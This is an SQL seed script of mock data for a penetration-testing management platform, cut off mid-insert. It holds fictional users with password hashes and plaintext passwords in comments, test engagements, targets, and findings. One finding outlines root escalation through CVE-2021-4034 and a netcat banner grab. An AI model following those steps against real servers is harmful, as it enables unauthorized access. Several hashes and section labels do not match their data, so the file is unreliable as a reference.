-- This file contains extensive mock data for the penetration testing platform
-- WARNING: This is mock data and should not be used in production

-- Clear existing mock data if any exists (but preserve admin user)
DELETE FROM vulnerabilities WHERE id > 0;
DELETE FROM targets WHERE id > 0;  
DELETE FROM tests WHERE id > 0;
DELETE FROM users WHERE role_id IN (1, 2); -- Remove customers and pentesters, keep admin

-- Reset sequences to ensure consistent IDs
-- After deleting mock users, reset the sequence to start from 2 (next after admin)
SELECT setval('users_id_seq', 1, true);
SELECT setval('tests_id_seq', 1, false);
SELECT setval('targets_id_seq', 1, false);
SELECT setval('vulnerabilities_id_seq', 1, false);

-- Additional Users (Customers)
-- These will get auto-incremented IDs starting from 2 (assuming admin user ID=1 exists)
-- Passwords are hashed using PHP password_hash() function with PASSWORD_DEFAULT
INSERT INTO users (email, password, role_id) VALUES 
    ('john.smith@techcorp.com', '$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi', 1),           -- password123 
    ('sarah.johnson@healthsys.org', '$2y$10$TKh8H1.PfQx37YgCzwiKb.KjNyWgaHb9cbcoQgdIVFlYg7B77UdFm', 1),         -- secure456
    ('michael.brown@financeco.com', '$2y$10$PIy8YXs3jS5Zxp2u3O0w5OwVl8.7Aej.1vN0EGsJOLgZq9LdGNg2G', 1),          -- pass789
    ('lisa.wilson@retailchain.com', '$2y$10$fP/ZxMnQcU2eN7L8wLvHm.9fGNq5K7zQsN2lXj8.pGQ5VdKr3eFqm', 1),          -- mypass321
    ('david.martinez@edutech.edu', '$2y$10$YrL8QdUzN1F8sJ3vGmN.8uNzPvLd2fMxW7gVc8eS5rKgF2qDwEyNm', 1),           -- school2023
    ('jennifer.davis@manufacturing.inc', '$2y$10$KzL9XcQwM1E8rJ2uFlM.9tMzOuKc1eJyW6gUa7eR4qJgE1pCvDxLk', 1),      -- factory456
    ('robert.garcia@logistics.net', '$2y$10$GqI9VbPvL1D7pI1tDkL.8sLzNtJb0dIxV5fTa6dQ3pIfD0oBuCwJk', 1),        -- shipping789
    ('maria.rodriguez@pharma.co', '$2y$10$FpH8UaOuK0C6oH0sCjK.7rKzMsIa9cHwU4eSa5cP2oHeC9nAtBvIj', 1),           -- medicine123
    ('james.anderson@energy.org', '$2y$10$EoG7TaNtJ9B5nG9rBiJ.6qJzLrHa8bGvT3dRa4bO1nGdB8mZsBuHi', 1),          -- power2023
    ('patricia.thomas@insurance.com', '$2y$10$DoF6SaMs19A4mF8qAhI.5pIzKqGa7aFuS2cQa3aN0mFcA7lYrAtGh', 1),       -- coverage456
    ('christopher.jackson@telecom.net', '$2y$10$CnE5RaLr08Z3lE7pZgH.4oHzJpFa6ZEtR1bPa2ZM9lEbZ6kXqZsGg', 1),      -- network789
    ('linda.white@realestate.biz', '$2y$10$BmD4QaKq97Y2kD6oYfG.3nGzIoEa5YDsQ0aOa1YL8kDaY5jWpYrFf', 1),        -- property123
    ('matthew.harris@consulting.pro', '$2y$10$AlC3PaJp86X1jC5nXeF.2mFzHnDa4XCrP9ZNa0XK7jCZX4iVoXqEe', 1),      -- advisor456
    ('susan.martin@nonprofit.org', '$2y$10$ZkB2OaIo75W0iB4mWeE.1lEzGmCa3WBqO8YMZ9WJ6iBYW3hUoWpDd', 1),         -- charity789
    ('daniel.thompson@startup.io', '$2y$10$YjA1NaHn64V9hA3lVdD.0kDzFlBa2VApN7XLY8VI5hAXV2gTnVoC', 1),          -- innovation123
    ('karen.garcia@government.gov', '$2y$10$XiZ0MaGm53U8gZ2kUcC.9jCzEkAa1UZoM6WKX7UH4gZYU1fSmUn', 1),          -- public456
    ('paul.martinez@aviation.aero', '$2y$10$WhY9LaFl42T7fY1jTbB.8iBzDjZa0TYnL5VJW6TG3fYXT0eRlTmB', 1),         -- flight789
    ('nancy.robinson@hospitality.com', '$2y$10$VgX8KaEk31S6eX0iSaA.7hAzCiYa9SXmK4UIV5SF2eXWS9dQkSlA', 1),        -- hotel123
    ('mark.clark@automotive.auto', '$2y$10$UfW7JaD931R5dW9hRZz.6gZzBhXa8RWlJ3THU4RE1dWVR8cPjRkZ', 1),          -- car456
    ('dorothy.rodriguez@media.news', '$2y$10$TeV6IaC820Q4cV8gQYy.5fYzAgWa7QVkI2SGT3QD0cVUS7bOiQjY', 1);         -- press789

-- Additional Pentesters
-- These will get auto-incremented IDs starting from 22
-- Passwords are hashed using PHP password_hash() function with PASSWORD_DEFAULT
INSERT INTO users (email, password, role_id) VALUES 
    ('alex.hacker@securityfirm.com', '$2y$10$SrU5HaDj20P3cU7oQXx.5eXzAgVa6PWjH1RFS2PB9cUSP6aOhPjX', 2),        -- ethical123
    ('sam.penetrator@cybersec.net', '$2y$10$RqT4GaC831O2bT6nPWw.4dWzZfUa5OViG0QER1OA8bTRO5ZNgOiW', 2),          -- testing456
    ('jordan.exploit@infosec.org', '$2y$10$QpS3FaB720N1aS5mOVv.3cVzYeT5NHuF9PNDq0NZ7aSQN4YMfNhV', 2),           -- vuln789
    ('casey.security@redteam.com', '$2y$10$PoR2EaA619M0ZR4lNUu.2bUzXdSa4MGdE8MCp9MY6ZRMz3XLeMgU', 2),            -- breach123
    ('taylor.cyber@whitehat.net', '$2y$10$OnQ1DaZ508L9YQ3kMTt.1aYzWcRa3LFcD7LBo8LX5YQky2WKdLfT', 2),           -- defend456
    ('morgan.infosec@consulting.sec', '$2y$10$NmP0CaY497K8XP2jLSs.0ZXzVbQa2KEbC6KAn7KW4XPjx1VJcKeS', 2),        -- assess789
    ('riley.pentester@security.pro', '$2y$10$MlO9BaX386J7WO1iKRr.9YWzUaP1JDaA5JZm6JV3WOiw0UIdBJeR', 2),        -- audit123
    ('quinn.researcher@vulnlab.com', '$2y$10$LkN8AaW275I6VN0hJQq.8XVzTZNa0ICZ94YIl5IU2VNhv9THaIdQ', 2),         -- research456
    ('avery.analyst@threathunt.org', '$2y$10$KjM7ZaV164H5UM9gIFp.7WUzSYMZ9HBY83XHk4HT1UMgx8SGZHcP', 2),         -- hunt789
    ('dakota.security@forensics.net', '$2y$10$JiL6YaU053G4TL8fHEo.6VTzRXLa8GAX72WGj3GS0TLfy7RFyGbO', 2);        -- investigate123

-- Comprehensive Test Scenarios
INSERT INTO tests (customer_id, pentester_id, test_name, test_description, test_date, completed) VALUES
    (2, 22, 'E-commerce Platform Security Assessment', 'Comprehensive security testing of online retail platform', '2024-01-15 09:00:00', true),
    (3, 23, 'Mobile Banking App Penetration Test', 'Security assessment of iOS and Android banking applications', '2024-01-20 10:00:00', true),
    (4, 24, 'Corporate Network Infrastructure Test', 'Internal network security assessment and penetration testing', '2024-02-01 08:30:00', false),
    (5, 25, 'Cloud Infrastructure Security Audit', 'AWS/Azure cloud environment security assessment', '2024-01-10 11:00:00', true),
    (6, 26, 'Healthcare Management System Test', 'HIPAA-compliant healthcare application security testing', '2024-01-25 13:00:00', true),
    (7, 27, 'Financial Trading Platform Assessment', 'High-frequency trading platform security evaluation', '2024-02-05 09:15:00', true),
    (8, 28, 'IoT Device Security Testing', 'Internet of Things devices vulnerability assessment', '2024-02-10 10:30:00', false),
    (9, 29, 'Government Portal Security Audit', 'Public sector web portal security assessment', '2024-01-12 08:00:00', true),
    (10, 30, 'Enterprise API Security Testing', 'RESTful API endpoints security evaluation', '2024-01-28 12:00:00', true),
    (11, 31, 'Cryptocurrency Exchange Assessment', 'Digital currency trading platform security test', '2024-02-08 11:30:00', false),
    (12, 22, 'Educational Platform Security Test', 'Online learning management system assessment', '2024-01-18 09:45:00', true),
    (13, 23, 'Manufacturing Control Systems Test', 'Industrial control systems security assessment', '2024-02-01 07:30:00', true),
    (14, 24, 'Social Media Platform Assessment', 'Large-scale social networking platform security test', '2024-02-12 10:00:00', false),
    (15, 25, 'Telecommunications Infrastructure Test', 'Telecom network and systems security assessment', '2024-01-22 08:15:00', true),
    (16, 26, 'Gaming Platform Security Audit', 'Online gaming platform and payment system test', '2024-02-03 13:30:00', true),
    (17, 27, 'Supply Chain Management Test', 'Logistics and supply chain system security assessment', '2024-02-14 09:00:00', false),
    (18, 28, 'Smart City Infrastructure Test', 'Municipal smart city systems security assessment', '2024-02-20 08:00:00', false),
    (19, 29, 'Insurance Platform Assessment', 'Insurance claims and policy management system test', '2024-01-30 11:15:00', true),
    (20, 30, 'Retail POS Systems Test', 'Point-of-sale systems security assessment', '2024-02-02 10:45:00', true),
    (21, 31, 'Energy Management Systems Test', 'Smart grid and energy management security assessment', '2024-02-16 07:45:00', false),
    (2, 22, 'Real Estate Platform Assessment', 'Property management and listing platform test', '2024-01-16 12:30:00', true),
    (3, 23, 'Transportation Management Test', 'Fleet and logistics management system assessment', '2024-02-11 09:30:00', false),
    (4, 24, 'Content Management System Test', 'Enterprise CMS security assessment', '2024-01-14 10:15:00', true),
    (5, 25, 'Video Streaming Platform Test', 'Media streaming service security assessment', '2024-01-26 14:00:00', true),
    (6, 26, 'Warehouse Management System Test', 'Inventory and warehouse automation security test', '2024-02-13 08:30:00', false),
    (7, 27, 'Customer Relationship Management Test', 'CRM platform security assessment', '2024-01-21 11:45:00', true),
    (8, 28, 'Document Management System Test', 'Enterprise document storage and sharing platform test', '2024-02-04 09:15:00', true),
    (9, 29, 'Human Resources Platform Test', 'HR management system security assessment', '2024-02-15 10:30:00', false),
    (10, 30, 'Project Management Tool Test', 'Collaborative project management platform assessment', '2024-01-23 13:15:00', true),
    (11, 31, 'Business Intelligence Platform Test', 'Data analytics and BI dashboard security test', '2024-02-06 08:45:00', true),
    (12, 22, 'Email Security Gateway Test', 'Enterprise email security system assessment', '2024-01-17 09:30:00', true),
    (13, 23, 'Database Security Assessment', 'Enterprise database systems security evaluation', '2024-02-17 11:00:00', false),
    (14, 24, 'Backup and Recovery System Test', 'Data backup and disaster recovery system assessment', '2024-01-19 08:15:00', true),
    (15, 25, 'Identity Management System Test', 'Single sign-on and identity management platform test', '2024-02-07 12:45:00', true),
    (16, 26, 'Network Security Appliance Test', 'Firewall and network security devices assessment', '2024-02-18 07:30:00', false),
    (17, 27, 'Virtualization Platform Test', 'VMware/Hyper-V virtualization security assessment', '2024-01-24 10:00:00', true),
    (18, 28, 'Container Security Assessment', 'Docker/Kubernetes container security evaluation', '2024-02-19 09:45:00', false),
    (19, 29, 'Blockchain Platform Test', 'Distributed ledger technology security assessment', '2024-02-25 11:30:00', false),
    (20, 30, 'Machine Learning Platform Test', 'AI/ML model serving platform security assessment', '2024-02-09 13:00:00', true),
    (21, 31, 'DevOps Pipeline Security Test', 'CI/CD pipeline and development tools assessment', '2024-02-21 08:00:00', false),
    (2, 22, 'Web Application Security Review', 'Comprehensive web application security assessment', '2024-02-22 09:00:00', true),
    (3, 23, 'Mobile Application Security Review', 'iOS and Android mobile app security testing', '2024-02-23 10:00:00', false),
    (4, 24, 'HIPAA Compliance Security Audit', 'Healthcare application HIPAA compliance assessment', '2024-02-24 11:00:00', true),
    (5, 25, 'EHR System Penetration Test', 'Electronic Health Records system security testing', '2024-02-25 12:00:00', false),
    (6, 26, 'Financial Services Security Assessment', 'Banking and financial platform security review', '2024-02-26 13:00:00', true),
    (7, 27, 'E-learning Platform Security Test', 'Educational technology platform security assessment', '2024-02-27 14:00:00', false),
    (8, 28, 'Medical Device Security Assessment', 'Healthcare IoT devices and medical equipment security testing', '2024-02-28 15:00:00', true),
    (9, 29, 'PCI DSS Compliance Assessment', 'Payment card industry data security standard compliance audit', '2024-03-01 08:00:00', false);

-- Extensive Target Creation for Each Test
INSERT INTO targets (test_id, target_name, target_description) VALUES 
    -- E-commerce Platform Security Assessment (Test ID 1)
    (1, 'User Authentication System', 'Login and registration functionality with password reset capabilities'),
    (1, 'Customer Dashboard', 'Main user interface after successful authentication'),
    (1, 'Payment Processing Module', 'Credit card processing and payment gateway integration'),
    (1, 'User Profile Management', 'Personal information and account settings management'),
    (1, 'File Upload Functionality', 'Document and image upload features'),
    (1, 'Search and Filter System', 'Product and content search with advanced filtering options'),
    (1, 'Admin Control Panel', 'Administrative interface for system management'),
    (1, 'API Endpoints', 'RESTful API services consumed by frontend applications'),
    (1, 'Session Management', 'User session handling and timeout mechanisms'),
    (1, 'Shopping Cart System', 'E-commerce cart and checkout workflow'),
    
    -- Mobile Banking App Penetration Test (Test ID 2)
    (2, 'iOS Application Binary', 'Compiled iOS application for reverse engineering analysis'),
    (2, 'Android APK Package', 'Android application package for static and dynamic analysis'),
    (2, 'Mobile API Gateway', 'Backend API services specifically designed for mobile consumption'),
    (2, 'Push Notification Service', 'System handling push notifications to mobile devices'),
    (2, 'Biometric Authentication', 'Fingerprint and face recognition authentication features'),
    (2, 'Local Data Storage', 'SQLite databases and keychain storage on mobile devices'),
    (2, 'Certificate Pinning Implementation', 'SSL certificate validation and pinning mechanisms'),
    (2, 'Deep Link Handlers', 'URL scheme handlers for app-to-app communication'),
    (2, 'In-App Purchase System', 'Mobile payment processing and subscription management'),
    (2, 'Offline Mode Functionality', 'Data synchronization and offline operation capabilities'),
    
    -- Corporate Network Infrastructure Test (Test ID 3)
    (3, 'Domain Controller Servers', 'Active Directory domain controllers managing user authentication'),
    (3, 'File Share Servers', 'Network attached storage systems containing corporate documents'),
    (3, 'Email Exchange Servers', 'Microsoft Exchange email infrastructure'),
    (3, 'VPN Gateway', 'Remote access VPN concentrator for external connections'),
    (3, 'Firewall Appliances', 'Network perimeter security devices'),
    (3, 'Wireless Access Points', 'Corporate WiFi infrastructure and guest networks'),
    (3, 'Network Switches', 'Layer 2/3 switching infrastructure'),
    (3, 'Backup Systems', 'Network backup and disaster recovery infrastructure'),
    (3, 'Print Servers', 'Network printing infrastructure and queue management'),
    (3, 'Database Servers', 'Corporate database systems and data warehouses'),
    
    -- Cloud Infrastructure Security Audit (Test ID 4)
    (4, 'AWS EC2 Web Servers', 'Production web servers running application frontend and API services'),
    (4, 'RDS MySQL Database Cluster', 'Primary database cluster containing customer and transaction data'),
    (4, 'S3 Bucket Storage', 'Object storage containing application assets and user uploads'),
    (4, 'Lambda Serverless Functions', 'Serverless functions handling background processing and integrations'),
    (4, 'Application Load Balancer', 'Load balancer distributing traffic across multiple availability zones'),
    (4, 'CloudFront CDN', 'Content delivery network serving static assets globally'),
    (4, 'IAM Roles and Policies', 'Identity and access management configuration for all AWS resources'),
    (4, 'VPC Network Configuration', 'Virtual private cloud setup including subnets and security groups'),
    (4, 'CloudWatch Monitoring', 'Monitoring and logging infrastructure for operational visibility'),
    (4, 'AWS WAF Configuration', 'Web application firewall protecting against common attacks'),
    
    -- Healthcare Management System Test (Test ID 5)
    (5, 'Patient Portal Interface', 'Web portal allowing patients to access medical records'),
    (5, 'Electronic Health Records Database', 'Primary database storing protected health information'),
    (5, 'Physician Workstation Access', 'Desktop applications used by healthcare providers'),
    (5, 'Medical Imaging System', 'DICOM image storage and viewing system'),
    (5, 'Prescription Management System', 'Electronic prescribing and medication management'),
    (5, 'Audit Logging Infrastructure', 'Comprehensive logging system for HIPAA compliance'),
    (5, 'Backup and Recovery Systems', 'Data backup and disaster recovery procedures'),
    (5, 'Network Access Controls', 'Systems controlling access to PHI from various endpoints'),
    (5, 'Encryption Key Management', 'Key management system for data encryption'),
    (5, 'Patient Communication Portal', 'Secure messaging between patients and providers'),
    (34, 'API Endpoints', 'RESTful API services consumed by frontend applications'),
    (34, 'Session Management', 'User session handling and timeout mechanisms'),
    (34, 'Contact Form', 'Customer inquiry and support request submission'),
    (34, 'Password Reset Functionality', 'Self-service password reset and recovery system'),
    (34, 'Two-Factor Authentication', 'Multi-factor authentication implementation'),
    (34, 'Shopping Cart System', 'E-commerce cart and checkout workflow'),
    (34, 'Notification Center', 'In-app notification and messaging system'),
    (34, 'Account Verification', 'Email and phone number verification processes'),
    
    -- Mobile Application Security Review (Test ID 35)
    (35, 'iOS Application Binary', 'Compiled iOS application for reverse engineering analysis'),
    (35, 'Android APK Package', 'Android application package for static and dynamic analysis'),
    (35, 'Mobile API Gateway', 'Backend API services specifically designed for mobile consumption'),
    (35, 'Push Notification Service', 'System handling push notifications to mobile devices'),
    (35, 'Biometric Authentication', 'Fingerprint and face recognition authentication features'),
    (35, 'Local Data Storage', 'SQLite databases and keychain storage on mobile devices'),
    (35, 'Certificate Pinning Implementation', 'SSL certificate validation and pinning mechanisms'),
    (35, 'Deep Link Handlers', 'URL scheme handlers for app-to-app communication'),
    (35, 'In-App Purchase System', 'Mobile payment processing and subscription management'),
    (35, 'Crash Reporting Service', 'Error tracking and crash report submission functionality'),
    (35, 'Offline Mode Functionality', 'Data synchronization and offline operation capabilities'),
    (35, 'Location Services Integration', 'GPS and location-based service implementations'),
    (35, 'Camera and Media Access', 'Photo capture and media library access controls'),
    (35, 'Background Processing', 'Background task execution and data synchronization'),
    (35, 'Device Information Access', 'System information and device identifier collection'),
    
    -- HIPAA Compliance Security Audit (Test ID 36)
    (36, 'Patient Portal Interface', 'Web portal allowing patients to access medical records'),
    (36, 'Electronic Health Records Database', 'Primary database storing protected health information'),
    (36, 'Physician Workstation Access', 'Desktop applications used by healthcare providers'),
    (36, 'Medical Imaging System', 'DICOM image storage and viewing system'),
    (36, 'Prescription Management System', 'Electronic prescribing and medication management'),
    (36, 'Audit Logging Infrastructure', 'Comprehensive logging system for HIPAA compliance'),
    (36, 'Backup and Recovery Systems', 'Data backup and disaster recovery procedures'),
    (36, 'Network Access Controls', 'Systems controlling access to PHI from various endpoints'),
    (36, 'Encryption Key Management', 'Key management system for data encryption'),
    (36, 'Business Associate Agreements', 'Third-party integration security and compliance'),
    (36, 'Patient Communication Portal', 'Secure messaging between patients and providers'),
    (36, 'Insurance Verification System', 'Patient insurance validation and authorization'),
    (36, 'Appointment Scheduling System', 'Patient and provider appointment management'),
    (36, 'Billing and Claims Processing', 'Medical billing and insurance claims system'),
    (36, 'Laboratory Information System', 'Lab results management and integration'),
    
    -- EHR System Penetration Test (Test ID 37)
    (37, 'HL7 FHIR API Gateway', 'Healthcare interoperability API for data exchange'),
    (37, 'Clinical Decision Support System', 'AI-powered diagnostic and treatment recommendation engine'),
    (37, 'Laboratory Information System', 'Lab result management and integration system'),
    (37, 'Pharmacy Integration Module', 'Electronic prescription and medication dispensing interface'),
    (37, 'Insurance Verification System', 'Patient insurance validation and claims processing'),
    (37, 'Appointment Scheduling System', 'Patient and provider scheduling functionality'),
    (37, 'Telemedicine Platform', 'Video conferencing and remote consultation system'),
    (37, 'Medical Device Integration', 'Integration with various medical monitoring devices'),
    (37, 'Clinical Documentation System', 'Medical record creation and management tools'),
    (37, 'Quality Metrics Dashboard', 'Healthcare quality reporting and analytics platform'),
    (37, 'Population Health Management', 'Patient population analytics and care coordination'),
    (37, 'Clinical Trial Management', 'Research study patient enrollment and data collection'),
    (37, 'Revenue Cycle Management', 'Financial and billing workflow automation'),
    (37, 'Care Coordination Platform', 'Multi-provider communication and care planning'),
    (37, 'Patient Engagement Tools', 'Patient education and self-service portals'),
    
    -- Medical Device Security Assessment (Test ID 8)
    (8, 'Infusion Pump Network Interface', 'Connected medical device for IV medication delivery'),
    (8, 'Patient Monitoring System', 'Bedside monitors tracking vital signs'),
    (8, 'MRI Machine Network Connection', 'Network-enabled magnetic resonance imaging equipment'),
    (8, 'Ventilator Control System', 'Mechanical ventilation device with remote monitoring'),
    (8, 'Cardiac Monitoring Device', 'Heart rhythm monitoring and alerting system'),
    (8, 'Surgical Robot Interface', 'Computer-assisted surgical system controls'),
    (8, 'Laboratory Analyzer Network', 'Automated laboratory testing equipment'),
    (8, 'Pharmaceutical Dispensing Robot', 'Automated medication dispensing system'),
    (8, 'Imaging Workstation', 'Medical imaging viewing and analysis workstation'),
    (8, 'Device Management Portal', 'Centralized management system for medical devices'),
    (8, 'Anesthesia Machine Network', 'Connected anesthesia delivery and monitoring systems'),
    (8, 'Dialysis Machine Interface', 'Renal replacement therapy equipment with network connectivity'),
    (8, 'Blood Bank Management System', 'Blood product inventory and tracking system'),
    (8, 'Sterilization Equipment Network', 'Automated sterilization monitoring and control'),
    (8, 'Emergency Response Systems', 'Critical care alert and notification systems'),
    
    -- PCI DSS Compliance Assessment (Test ID 9)
    (9, 'Payment Gateway Interface', 'Primary payment processing endpoint for card transactions'),
    (9, 'Cardholder Data Environment', 'Network segment containing payment card information'),
    (9, 'POS Terminal Network', 'Point-of-sale devices and their network connections'),
    (9, 'Payment Card Database', 'Encrypted storage system for cardholder data'),
    (9, 'Tokenization Service', 'System replacing card numbers with secure tokens'),
    (9, 'Key Management System', 'Cryptographic key generation and management infrastructure'),
    (9, 'Network Segmentation Controls', 'Firewall and VLAN configurations isolating card data'),
    (9, 'Access Control Systems', 'User authentication and authorization for cardholder data'),
    (9, 'Vulnerability Scanning Infrastructure', 'Automated security scanning and assessment tools'),
    (9, 'Log Management System', 'Centralized logging and monitoring for PCI compliance'),
    (9, 'File Integrity Monitoring', 'System monitoring critical file and configuration changes'),
    (9, 'Penetration Testing Environment', 'Isolated environment for security testing'),
    (9, 'Incident Response Platform', 'Security incident detection and response system'),
    (9, 'Compliance Reporting Dashboard', 'PCI DSS compliance status and reporting interface'),
    (9, 'Third-Party Integration Gateway', 'Secure connections to payment processors and acquirers'),
    
    -- Financial Services Security Assessment (Test ID 10)
    (10, 'Customer Login Portal', 'Primary authentication interface for online banking'),
    (10, 'Account Balance Dashboard', 'Real-time account information and transaction history'),
    (10, 'Fund Transfer System', 'Internal and external money transfer functionality'),
    (10, 'Bill Payment Platform', 'Automated bill payment and scheduling system'),
    (10, 'Wire Transfer Interface', 'International and domestic wire transfer processing'),
    (10, 'Mobile Banking Gateway', 'API gateway serving mobile banking applications'),
    (10, 'Investment Portfolio Manager', 'Investment account management and trading platform'),
    (10, 'Loan Application System', 'Online loan application and approval workflow'),
    (10, 'Credit Card Management', 'Credit card account management and payment processing'),
    (10, 'Customer Support Chat', 'Secure messaging and support ticket system'),
    (10, 'Document Upload Portal', 'Secure document submission and verification system'),
    (10, 'Fraud Detection Engine', 'Real-time transaction monitoring and fraud prevention'),
    (10, 'Multi-Factor Authentication', 'Advanced authentication including SMS and hardware tokens'),
    (10, 'Session Management System', 'Secure session handling and timeout mechanisms'),
    (10, 'Regulatory Reporting Interface', 'Automated compliance reporting and audit trails'),
    
    -- Financial Services Security Assessment (Test ID 11)
    (11, 'ATM Terminal Hardware', 'Physical ATM machines and their security features'),
    (11, 'Network Communication Layer', 'Encrypted communication between ATMs and bank systems'),
    (11, 'Cash Dispensing Mechanism', 'Mechanical and electronic cash handling systems'),
    (11, 'Card Reader Interface', 'Magnetic stripe and chip card reading mechanisms'),
    (11, 'PIN Verification System', 'Secure PIN entry and verification processing'),
    (11, 'Transaction Processing Engine', 'Core system handling ATM transaction requests'),
    (11, 'Surveillance Camera System', 'Security camera monitoring and recording infrastructure'),
    (11, 'Alarm and Monitoring System', 'Physical security alerts and remote monitoring'),
    (11, 'Maintenance Access Controls', 'Technician authentication and service mode access'),
    (11, 'Cash Management System', 'Cash loading, tracking, and inventory management'),
    (11, 'Network Switch Infrastructure', 'Network equipment connecting ATMs to bank systems'),
    (11, 'Encryption Key Management', 'ATM cryptographic key distribution and management'),
    (11, 'Transaction Log Database', 'Comprehensive logging of all ATM transactions'),
    (11, 'Customer Interface Display', 'ATM screen and user interaction security'),
    (11, 'Receipt Printing System', 'Transaction receipt generation and printing'),
    
    -- E-commerce Platform Security Assessment (Test ID 12)
    (12, 'Product Catalog System', 'Product information management and display system'),
    (12, 'Shopping Cart Functionality', 'Customer cart management and checkout process'),
    (12, 'Payment Processing Gateway', 'Credit card and alternative payment method processing'),
    (12, 'Customer Account Management', 'User registration, login, and profile management'),
    (12, 'Order Management System', 'Order processing, fulfillment, and tracking'),
    (12, 'Inventory Management Database', 'Product inventory tracking and availability'),
    (12, 'Customer Review System', 'Product ratings, reviews, and moderation'),
    (12, 'Search and Recommendation Engine', 'Product search and personalized recommendations'),
    (12, 'Shipping Integration Portal', 'Third-party shipping provider integration'),
    (12, 'Customer Support System', 'Help desk, chat, and ticket management'),
    (12, 'Promotional Code Engine', 'Discount codes and promotional campaign management'),
    (12, 'Wish List Functionality', 'Customer product favorites and wish list management'),
    (12, 'Admin Dashboard', 'Merchant administration and analytics interface'),
    (12, 'Email Marketing Integration', 'Customer communication and marketing automation'),
    (12, 'Mobile Commerce Gateway', 'Mobile-optimized shopping and payment processing'),
    
    -- Retail POS Systems Test (Test ID 20)
    (20, 'POS Terminal Interface', 'Point-of-sale hardware and software interface'),
    (20, 'Payment Card Reader', 'Chip, contactless, and magnetic stripe card processing'),
    (20, 'Cash Register Integration', 'Cash drawer and receipt printer connectivity'),
    (20, 'Inventory Tracking System', 'Real-time inventory updates and stock management'),
    (20, 'Employee Authentication', 'Staff login and authorization for POS operations'),
    (20, 'Transaction Database', 'Local and cloud-based transaction storage'),
    (20, 'Network Communication', 'POS system connectivity to backend services'),
    (20, 'Customer Display Screen', 'Customer-facing transaction display and interaction'),
    (20, 'Barcode Scanner Integration', 'Product identification and price lookup'),
    (20, 'Gift Card Processing', 'Gift card activation, redemption, and balance checking'),
    (20, 'Tax Calculation Engine', 'Automated tax computation and compliance'),
    (20, 'Reporting Dashboard', 'Sales analytics and financial reporting'),
    (20, 'Offline Mode Capability', 'Continued operation during network outages'),
    (20, 'Loyalty Program Integration', 'Customer rewards and points management'),
    (20, 'Refund and Return Processing', 'Transaction reversal and return handling'),
    
    -- GDPR Compliance Assessment (Test ID 13)
    (13, 'Data Collection Interfaces', 'Web forms and APIs collecting customer information'),
    (13, 'Consent Management Platform', 'GDPR consent tracking and management system'),
    (13, 'Customer Data Database', 'Primary storage of personal customer information'),
    (13, 'Data Processing Workflows', 'Automated customer data processing and analytics'),
    (13, 'Third-Party Integration APIs', 'Data sharing with external service providers'),
    (13, 'Data Retention Management', 'Automated data deletion and archival systems'),
    (13, 'Privacy Policy Engine', 'Dynamic privacy policy generation and updates'),
    (13, 'Data Subject Rights Portal', 'Customer self-service for data access and deletion'),
    (13, 'Cross-Border Data Transfer', 'International data transfer and compliance systems'),
    (13, 'Data Anonymization Tools', 'Customer data de-identification and pseudonymization'),
    (13, 'Cookie Management System', 'Website cookie consent and preference management'),
    (13, 'Data Breach Detection', 'Monitoring systems for unauthorized data access'),
    (13, 'Privacy Impact Assessment', 'Automated privacy risk evaluation tools'),
    (13, 'Marketing Preference Center', 'Customer communication preference management'),
    (13, 'Data Quality Management', 'Customer data accuracy and validation systems');

-- Extensive Vulnerability Data with Detailed Information
INSERT INTO vulnerabilities (
    target_id, affected_entity, identifier, risk_statement, affected_component,
    residual_risk, classification, identified_controls, cvss_score, 
    likelihood, cvssv3_code, location, vulnerabilities_description, 
    reproduction_steps, impact, remediation_difficulty, recommendations, 
    recommended_reading, response
) VALUES 
    -- AWS EC2 Web Servers Vulnerabilities (Cloud Infrastructure Security Audit - Test ID 4)
    (4, 'EC2 Instance', 'CLOUD-001', 'Outdated operating system with known vulnerabilities', 'Operating System', 'High', 'Security Misconfiguration', 'Automated patching not enabled', 8.1, 'High', 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L', '10.0.1.15', 'EC2 instances running Ubuntu 18.04 with multiple unpatched CVEs including privilege escalation vulnerabilities. The instances have not been updated in over 6 months and are missing critical security patches including CVE-2021-4034 (PwnKit) and CVE-2022-0847 (Dirty Pipe).', 
    'Steps to reproduce:\n1. Scan the target EC2 instance using nmap to identify open ports\n2. Use banner grabbing techniques to identify Ubuntu version: nc -nv [IP] 22\n3. Cross-reference with CVE database for known vulnerabilities\n4. Exploit CVE-2021-4034 using publicly available exploit code\n5. Gain root access to the system and demonstrate privilege escalation\n6. Access sensitive configuration files and application data', 
    'An attacker could exploit these vulnerabilities to gain unauthorized root access to the web servers, potentially compromising customer data, defacing the website, installing malware, or using the servers as a pivot point for lateral movement within the AWS environment. This could lead to complete infrastructure compromise.',
    'Easy', 
    'Implement automated patching using AWS Systems Manager Patch Manager with maintenance windows. Establish a regular patching schedule for critical and high-severity updates. Consider using AWS Inspector for continuous vulnerability assessment. Deploy intrusion detection systems to monitor for exploitation attempts.',
    'https://docs.aws.amazon.com/systems-manager/latest/userguide/systems-manager-patch.html\nhttps://aws.amazon.com/inspector/\nhttps://ubuntu.com/security/notices\nhttps://nvd.nist.gov/vuln/detail/CVE-2021-4034',
    NULL),
    
    (4, 'Security Group', 'CLOUD-002', 'Overly permissive security group rules exposing services', 'Network Security', 'Medium', 'Network Controls', 'Default security groups in use', 6.5, 'Medium', 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N', 'sg-0123456789abcdef0', 'Security groups allow inbound traffic from 0.0.0.0/0 on multiple ports including SSH (22), HTTP (80), HTTPS (443), and custom application ports (8080, 3000). This violates the principle of least privilege and exposes services unnecessarily to the entire internet.', 
    'Steps to reproduce:\n1. Review security group configurations in AWS Management Console\n2. Identify rules allowing 0.0.0.0/0 access on sensitive ports\n3. Test connectivity from external IP addresses using telnet or nc\n4. Document all exposed services and their response banners\n5. Assess potential attack vectors for each exposed service\n6. Attempt to access admin interfaces or sensitive endpoints',
    'Overly permissive security groups significantly increase the attack surface and may allow attackers to access services that should be restricted to specific IP ranges, VPNs, or internal networks only. This could facilitate reconnaissance, brute force attacks, and direct exploitation of exposed services.',
    'Easy',
    'Implement security group rules following the principle of least privilege. Restrict SSH access to specific IP ranges or use AWS Systems Manager Session Manager. Use Application Load Balancer for HTTP/HTTPS traffic and remove direct instance access. Implement bastion hosts for administrative access.',
